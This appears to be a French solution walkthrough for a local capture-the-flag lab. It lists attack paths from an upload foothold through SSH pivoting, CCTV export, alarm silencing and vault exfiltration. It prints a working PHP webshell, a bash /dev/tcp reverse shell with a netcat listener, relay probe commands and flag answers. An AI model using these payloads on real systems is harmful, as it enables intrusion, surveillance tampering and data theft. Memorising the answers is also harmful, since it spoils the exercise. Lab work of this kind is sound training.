# ANGLE MORT — voies d’attaque (lab hybride)

Même flags au scoreboard ; plusieurs chemins selon le niveau / les outils.

## Prérequis lab

```bash
cp .env.example .env
make up
```

| Accès | URL / port |
|-------|------------|
| Hub OSINT | `http://127.0.0.1:${HUB_PORT}` (18080) |
| Pivot public (gateway) | `http://127.0.0.1:${PIVOT_PORT}` (18081) |
| SSH ops (pivot) | `ops@127.0.0.1` port `${PIVOT_SSH_PORT}` (2222) |

---

## Étape 1 — Foothold `FOOTHOLD: CASE-2194-A`

### Voie A — Web (legacy render)

1. Indices : `partner.html`, `deploy-note.txt`, `diag` template.
2. `GET /internal/auth-gateway/v2/render.php?mode=legacy&tpl=omega/proofs/foothold`

### Voie B — Shell (webshell)

1. Commentaire HTML sur `partner.html` → `legacy-upload.php`.
2. Upload d’un `.phtml` (ex. `mirror.phtml`) :

```bash
curl -F 'artifact=@mirror.phtml' \
  "http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/legacy-upload.php"
```

Exemple minimal `mirror.phtml` :

```php
<?php
if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd'] . ' 2>&1'); }
```

3. Exécution : `/uploads/staging/mirror.phtml?cmd=cat%20/opt/omega/proofs/FOOTHOLD.txt`

### Voie C — Reverse shell (optionnel)

Depuis la webshell, si le réseau sortant le permet :

```bash
# Sur la machine attaquant : nc -lvnp 4444
# Sur le pivot (via ?cmd=) :
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

`LHOST` : souvent `host.docker.internal` (Docker Desktop) ou l’IP LAN du poste.

---

## Étape 2 — Élévation `ELEVATION: OPS-CLEARANCE-2`

### Voie A — Web (ops-relay)

1. Audit : `render.php?mode=legacy&tpl=omega/logs/audit` → session `ops-sess-8842`.
2. Runbook : dériver la clé `reverse(BT-AUTH-4421):n.morel` → `1442-HTUA-TB:n.morel`.
3. `GET ops-relay.php?bind=ops-sess-8842`
4. `POST action=upgrade&key=1442-HTUA-TB:n.morel`
5. `GET action=export&artifact=elevation`

### Voie B — Shell

Même runbook via `cat` sur les fichiers ; ou lecture directe si déjà en shell.

---

## Étape 3 — CCTV `CCTV: BLINDSPOT-OK-<digits>`

**Prérequis :** clearance 2 (web relay) ou clé SSH ops.

### Voie A — Web (relay probe)

```bash
# Après upgrade clearance 2 (cookies relay)
curl -b cookies.txt -G \
  --data-urlencode 'action=probe' \
  --data-urlencode 'target=cctv' \
  --data-urlencode 'path=/api/export.php?id=int-cam3-offline&scope=legacy&as=ops' \
  "http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/ops-relay.php"
```

Inventaire : `action=mesh`.

### Voie B — SSH + curl interne

1. `GET action=ssh-bundle` (clearance 2) ou lire `/opt/omega/ops/ssh/id_ops.leak` en shell.
2. `ssh -i id_ops -p ${PIVOT_SSH_PORT} ops@127.0.0.1`
3. `curl -fsS 'http://cctv:8080/api/export.php?id=int-cam3-offline&scope=legacy&as=ops'`

### Voie C — SSH port-forward (depuis le poste attaquant)

```bash
ssh -i id_ops -N -L 18082:cctv:8080 -p ${PIVOT_SSH_PORT} ops@127.0.0.1
curl -fsS 'http://127.0.0.1:18082/api/export.php?id=int-cam3-offline&scope=legacy&as=ops'
```

### Voie D — SOCKS / chisel (avancé)

Voir `omega/ops/tunnel-note` (legacy render ou relay mesh).

---

## Étape 3b — Alarme terrain `ALERT: SILENCED-BT-4421`

**Prérequis :** clearance 2 (même session relay que CCTV).

L’équipe terrain ne doit pas partir tant que l’alerting est armé. **Silencer avant** l’export plan cam-3.

1. Statut : `tpl=omega/ops/alarm-token` ou `action=mesh` sur le relay.
2. **UI navigateur (recommandé)** — après `bind` + upgrade clearance 2 sur le relay (même navigateur / cookies) :
   `http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/ops-alarm-panel.php`
3. UI directe alarm (optionnel) : tunnel SSH **depuis le Mac** (pas depuis le shell ops) :
   `ssh -i <clé_ops> -p 2222 -N -L 18083:alarm:8080 ops@127.0.0.1` → http://127.0.0.1:18083/
4. Silence (relay CLI) :

```bash
curl -b cookies.txt -G \
  --data-urlencode 'action=probe' \
  --data-urlencode 'target=alarm' \
  --data-urlencode 'path=/api/silence.php?token=BT-ALARM-OPS-4421&window=cam3' \
  "http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/ops-relay.php"
```

5. Depuis **ops@pivot** : `curl -fsS 'http://alarm:8080/api/silence.php?token=BT-ALARM-OPS-4421&window=cam3'`

Preuve : **`ALERT: SILENCED-BT-4421`**

---

## Étape 4 — Terrain `TERRAIN: CAM3-PLAN-EXPORT-<hex>`

**Prérequis :** clearance 2 + token admin CCTV + **alarme silencée** (armed=no).

1. Token : `render.php?mode=legacy&tpl=omega/ops/cctv-token` ou `action=mesh`.
2. Export plan :

```bash
curl -b cookies.txt -G \
  --data-urlencode 'action=probe' \
  --data-urlencode 'target=cctv' \
  --data-urlencode 'path=/api/export.php?id=int-cam3-plan&token=BT-CCTV-ADMIN-4421&as=admin' \
  "http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/ops-relay.php"
```

3. Console web (via tunnel SSH) : `http://cctv:8080/console.php`

---

## Étape 5 — OMEGA `OMEGA: DOSSIER-OMEGA-SHA256=<64 hex>`

**Prérequis :** clearance 2 + token vault SA.

1. Token : `tpl=omega/ops/vault-token` sur pivot.
2. Exfil :

```bash
curl -b cookies.txt -G \
  --data-urlencode 'action=probe' \
  --data-urlencode 'target=vault' \
  --data-urlencode 'path=/api/dossier.php?token=OMEGA-VAULT-SA-4421' \
  "http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/ops-relay.php"
```

Voie SSH : `curl -fsS 'http://vault:8080/api/dossier.php?token=OMEGA-VAULT-SA-4421'` depuis `ops@pivot`.

---

## Vérification auto

```bash
make smoke      # foothold → OMEGA (relay)
make smoke-ssh  # SSH ops → CCTV (+ terrain/vault en local)
```

Parcours complet : FOOTHOLD → ELEVATION → CCTV → **ALERT** → TERRAIN → OMEGA.

(Si scoreboard utilisé plus tard : flag **ALERT** ajouté côté `server.py`.)
